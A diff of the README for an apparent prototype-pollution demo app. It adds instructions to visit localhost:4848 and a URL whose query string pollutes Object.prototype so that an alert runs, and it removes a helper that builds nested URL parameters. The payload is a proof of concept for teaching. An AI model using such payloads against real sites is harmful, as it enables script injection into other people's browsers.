@@ -14,9 +14,13 @@ Running the server
 $ npm start
 ```
 
+Open browser and visit [http://localhost:4848](http://localhost:4848)
+
 ## Client Side Prototype Pollution
 
-`?__proto__[props][][value]=1&__proto__[name]=": ''.constructor.constructor('alert(`polluted`)')(),"`
+```
+http://localhost:4848?__proto__[props][][value]=1&__proto__[name]=": ''.constructor.constructor('alert(`polluted`)')(),"
+```
 
 ## Server Side Prototype Pollution
 
@@ -97,24 +101,3 @@ useFetch({
 ```
 
 Repeat step 2
-
-```js
-const createUrlParams = (data) => {
-  const getPairs = (obj, keys = []) => {
-    return Object.entries(obj).reduce((pairs, [key, value]) => {
-      if (typeof value === "object") {
-        pairs.push(...getPairs(value, [...keys, key]));
-      } else {
-        pairs.push([[...keys, key], value]);
-      }
-      return pairs;
-    }, []);
-  };
-
-  let mapped = getPairs(data).map(([[key, ...keysRest], value]) => {
-    return `${key}${keysRest.map((k) => `[${k}]`).join("")}=${value}`;
-  });
-
-  return mapped.join("&");
-};
-```
